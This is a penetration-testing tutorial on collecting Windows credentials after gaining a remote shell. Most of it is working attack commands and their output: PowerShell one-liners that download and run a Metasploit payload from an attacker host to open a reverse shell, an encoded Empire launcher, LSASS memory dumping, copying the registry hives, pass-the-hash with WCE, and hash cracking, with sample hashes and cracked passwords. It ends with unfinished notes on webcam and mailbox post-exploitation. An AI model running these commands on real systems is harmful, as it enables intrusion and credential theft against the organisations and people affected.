=================================================================================
Learning from the field: Gathering Windows Credentials & High-Impact Exploitation
=================================================================================

From the previous post, we learned how to have authenticated remote shell in windows, in this post, we will have a look around of how to **gather credentials after getting a remote shell**. We would also have a look how to have a **High-Impact post exploitation** which leaves an impact to the higher mangagement for the organization.

Gathering Windows Credentials
------------------------------

Once we have remote shell, our next task is to run mimikatz and get all the passwords ( clear-text or hashed ). A lot of stuff has already been mentioned at `Obtaining Windows Passwords <http://netsec.ws/?p=314>`_ and `Dumping Windows Credential <https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/>`_ There are multiple methods to do the following (Of gathering meterpreter or empire session or any other method):


Metasploit Web Delivery
^^^^^^^^^^^^^^^^^^^^^^^^

`Metasploit Web Delivery <https://www.offensive-security.com/metasploit-unleashed/web-delivery/>`_ : Metasploitâ€™s Web Delivery Script is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine. This module has a powershell method which generates a string which is needed to be executed on remote windows machine.

::

  msf > use exploit/multi/script/web_delivery 
  msf exploit(web_delivery) > show targets 

  Exploit targets:
  
     Id  Name
     --  ----
     0   Python
     1   PHP
     2   PSH  
  
  
  msf exploit(web_delivery) > set target 2
  target => 2
  msf exploit(web_delivery) > set payload windows/x64/meterpreter/reverse_https 
  payload => windows/x64/meterpreter/reverse_https
  msf exploit(web_delivery) > set lhost 14.97.131.138
  lhost => 14.97.131.138
  msf exploit(web_delivery) > run 
  [*] Exploit running as background job.

  [*] Started HTTPS reverse handler on https://14.97.131.138:8443
  msf exploit(web_delivery) > [*] Using URL: http://0.0.0.0:8080/uMOKs6wtlYL
  [*] Local IP: http://14.97.131.138:8080/uMOKs6wtlYL
  [*] Server started.
  [*] Run the following command on the target machine:
  powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');

When the following command (when their is no proxy)

::

  powershell.exe -nop -w hidden -c $X=new-object net.webclient;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');

or (when there is proxy)

::

  powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
 

is executed on the windows remote machine, we should get a meterpreter.

::

  Delivery web_delivery payload
  meterprerter>

Powershell Empire
^^^^^^^^^^^^^^^^^^

`Powershell Empire agent <https://www.powershellempire.com/>`_ : Empire is a pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture. Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.

After creating a listener, we just need to create a launcher using stager:

::

 (Empire: listeners) > usestager launcher 
 (Empire: stager/launcher) > set Listener test
 (Empire: stager/launcher) > generate
 powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAUwB0AGUAbQAuAE4ARQBUAMAA7ACQAdwBDAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBNAC4ATgBlAHQALgBXAEUAQgBDAGwASQBFAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAG*snip*4AOQA3AC4AMQAzADEALgAxADMAOAA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAEIAWABPAFIAJABLAFsAJABJACsAKwAlACQASwAuAEwAZQBOAEcAdABIAF0AfQA7AEkARQBYACAAKAAkAEIALQBKAG8ASQBOACcAJwApAA==

When the above command is executed on the windows remote shell, we should be able to get a powershell agent

::

 (Empire) > [+] Initial agent 2FTFYMKDFSSFS from 192.168.42.5 now active


Sometimes the above two will fail to work, in which case, we rever to the old techniques:

Dump Lsass.exe (Local Security Authority Subsystem Service)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Using Procdump: This method has been mentioned `Grabbing Passwords from Memory using Procdump and Mimikatz <https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/>`_ , `How Attackers Extract Credentials (Hashes) From LSASS <https://adsecurity.org/?p=462>`_ , `Mimikatz Minidump and mimikatz via bat file <http://carnal0wnage.attackresearch.com/2013/07/mimikatz-minidump-and-mimikatz-via-bat.html>`_ , `Extracting Clear Text Passwords Using Procdump and Mimikatz  <http://c0d3xpl0it.blogspot.in/2016/04/extracting-clear-text-passwords-using-procdump-and-mimikatz.html>`_ and `I'll Get Your Credentials ... Later! <http://www.fuzzysecurity.com/tutorials/18.html>`_

 * First, upload the `ProcDump.exe <https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx>`_ to the remote computer by using smb, windows explorer.

 * Second, from the remote shell, execute

  ::

   C:\Windows\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp     => For 32 bit system
   C:\Windows\temp\procdump.exe -accepteula -ma -64 lsass.exe lsass.dmp => For 64 bit system

 * Download the lsass.dmp and use mimikatz to get the passwords.

* Using Powershell Out-MiniDump

 This method is similar to the procdump using powershell. Instead of procdump, we utilize powershell `Out-MiniDump.ps1 <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1>`_ from PowerSploit

 * Launch PowerShell and `dot source <http://ss64.com/ps/source.html>`_ function from the Out-Minidump.ps1

  ::
   
   . c:\path\to\Out-Minidump.ps1

 * Create dump of the process using this syntax:

  ::

   Get-Process lsass | Out-Minidump -DumpFilePath C:\Windows\Temp

Registry Hives
^^^^^^^^^^^^^^^

Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your local system:

::

 C:\> reg.exe save hklm\sam c:\temp\sam.save
 C:\> reg.exe save hklm\security c:\temp\security.save
 C:\> reg.exe save hklm\system c:\temp\system.save

Get the password hashes of the local accounts, the cached domain credentials and the LSA secrets in a single run with Impacket secretsdump.py

::

 $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 Impacket v0.9.11-dev - Copyright 2002-2013 Core Security Technologies

 [*] Target system bootKey: 0x602e8c2947d56a95bf9cfxxxxxxxxxxx
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 admsys  :500 :aad3b435b51404eeaad3b435b51404ee:3e24dcead23468ce597d68xxxxxxxxxx:::
 Guest   :501 :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59dxxxxxxxxx:::
 support :1000:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b5xxxxxxxxx:::
 [*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
 adm2:6ec74661650377df488415415bf10321:system1.example.com:EXAMPLE:::
 Administrator:c4a850e0fee5af324a57fd2eeb8dbd24:system2.example.COM:EXAMPLE:::
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC
 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9adxxxxxxxxxx

Windows Credential Editor (WCE)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Windows Credentials Editor (WCE) is a security tool that allows to list Windows logon sessions and add, change, list and delete associated credentials (e.g.: LM/NT hashes, Kerberos tickets and cleartext passwords).

The tool allows users to:

* Perform Pass-the-Hash on Windows
* 'Steal' NTLM credentials from memory (with and without code injection)
* 'Steal' Kerberos Tickets from Windows machines
* Use the 'stolen' kerberos Tickets on other Windows or Unix machines to gain access to systems and services
* Dump cleartext passwords stored by Windows authentication packages

List NTLM credentials in memory: By default, WCE lists NTLM credentials in memory, no need to specify any options.

::

 C:\Users\test>wce.exe
 WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
 Use -h for help.

 theuser:amplialabs:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537 

Create a new logon session and launch a program with new NTLM credentials?

::

 wce.exe -s <username>:<domain>:<lmhash>:<nthash> -c <program>

Example:

::

 C:\Users\test>wce.exe -s testuser:amplialabs:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537 -c cmd.exe

 WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
 Use -h for help.

 Changing NTLM credentials of new logon session (000118914h) to:
 Username: testuser
 domain: amplialabs
 LMHash: 01FC5A6BE7BC6929AAD3B435B51404EE
 NTHash: 0CB6948805F797BF2A82807973B89537
 NTLM credentials successfully changed!

At this point, a new cmd.exe instance will be launched and network connections using NTLM initiated from that instance will use the NTLM credentials specified. 

Write hashes obtained by WCE to a file?

::

 C:\>wce -o output.txt
 WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
 Use -h for help.

 C:\>type output.txt
 test:AMPLIALABS:01020304050607080900010203040506:98971234567865019812734576890102

Dump logon cleartext passwords with WCE?

The -w switch can be used to dump logon passwords stored in cleartext by the Windows Digest Authentication package. For example:

::

 C:\>wce -w
 WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity com)
 Use -h for help.
 
 
 test\MYDOMAIN:mypass1234
 NETWORK SERVICE\WORKGROUP:test
 
`This <http://www.youtube.com/watch?v=tJ0VJVrhwTE&ap=%2526fmt%3d22>`_ video shows the use of the -w switch in a Windows 2008 Server

Useful Information:

* Cachedump obtains NTLM credentials from the Windows Credentials Cache (aka logon cache, logon information cache, etc). This cache can be disabled and it is very often disabled by network/domain/windows administrators (`see here <http://support.microsoft.com/kb/172931>`_ ). WCE will be able to steal credentials even when this cache is disabled.

* WCE obtains NTLM credentials from memory, which are used by the system to perform SSO; it uses a series of techniques the author of WCE developed.

* Pwdump dumps NTLM credentials from the local SAM. Let's say a administrator remote desktop to a server (compromised by attacker and can run wce). In this case, WCE would be able get the credential of Administrator ( who RDP'd ), However, pwdump will only allow you to obtain the NTLM credentials of the local SAM

The above information has been taken from `WCE FAQ <http://www.ampliasecurity.com/research/wcefaq.html>`_

System/ Security / SAM File
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

During penetration assesment, we do find VMDK file (Virtual Machine Disk), we should be able to mound vmdk file either by using Windows Explorer, VMWare Workstation or OSFMount. After mounting, we should be able to copy 

:: 

 System32/config/SYSTEM
 System32/config/SECURITY

Passwords from these file could be extracted by using `creddump7 <https://github.com/Neohapsis/creddump7>`_ 

Run cachedump.py on the SYSTEM and SECURITY hives to extract cached domain creds:

::

 # ./cachedump.py
 usage: ./cachedump.py <system hive> <security hive> <Vista/7>
 
 Example (Windows Vista/7):
 ./cachedump.py /path/to/System32/config/SYSTEM /path/to/System32/config/SECURITY true
 
 Example (Windows XP):
 ./cachedump.py /path/to/System32/SYSTEM /path/to/System32/config/SECURITY false
 
 # ./cachedump.py /mnt/win/Windows/System32/config/SYSTEM /mnt/win/Windows/System32/config/SECURITY true |tee hashes
 nharpsis:6b29dfa157face3f3d8db489aec5cc12:acme:acme.local
 god:25bd785b8ff1b7fa3a9b9e069a5e7de7:acme:acme.local

If you want to crack the hashes and have a good wordlist, John can be used. The hashes are in the 'mscash2' format:

::

 # john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt hashes
 Loaded 2 password hashes with 2 different salts (M$ Cache Hash 2 (DCC2) PBKDF2-HMAC-SHA-1 [128/128 SSE2 intrinsics 8x])
 g0d              (god)
 Welcome1!        (nharpsis)

The examples above are taken from creddump7 Readme


* MSF Webcam - Photo-Video/ Recorder modules

  * The Email- Mailbox Post exploitation -- Also the check if someone has exploited this (check logs) -- which is also connected to Domain? 

  * How does google email works?

  * File Hunting -- Better ways!! Faster ways!!




